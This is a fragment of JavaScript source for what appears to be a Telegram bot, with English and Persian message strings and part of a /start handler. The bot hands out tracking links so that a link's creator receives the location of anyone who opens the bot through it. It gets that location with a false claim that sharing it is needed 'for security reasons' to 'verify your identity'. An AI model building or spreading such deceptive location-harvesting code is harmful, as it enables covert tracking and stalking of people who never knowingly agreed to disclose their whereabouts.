...
const messages = {
  en: {
    ...
    trackLinkMessage: (url) => `Here is your unique tracking link to get locations:\n${url}\nShare this link with others, and when they start the bot with this link and share their location, their location will be sent to you!`,
    shareLocationMessage: 'For security reasons, please share your location to verify your identity.',
  ...
  fa: {
    ...
    trackLinkMessage: (url) => `این لینک ردیابی منحصر به فرد شما برای دریافت موقعیت است:\n${url}\nاین لینک را با دیگران به اشتراک بگذارید، و هنگامی که آنها ربات را با این لینک شروع کرده و موقعیت خود را به اشتراک بگذارند، موقعیت آنها برای شما ارسال خواهد شد!`,
    shareLocationMessage: 'به دلایل امنیتی، لطفاً موقعیت خود را برای تأیید هویت به اشتراک بگذارید.',
    ...
    if (update.message) {
      ...
      if (text?.startsWith('/start')) {
        ...
        if (user.requiresVerification) {
          // Show the share location button for tracking link
          console.log(`Showing share location button to user ${userId} with trackerId ${trackerId}`);
        ...
        if (user.requiresVerification && user.currentTrackerId) {
          ...
          console.log(`User ${userId} shared location but no verification is required`);
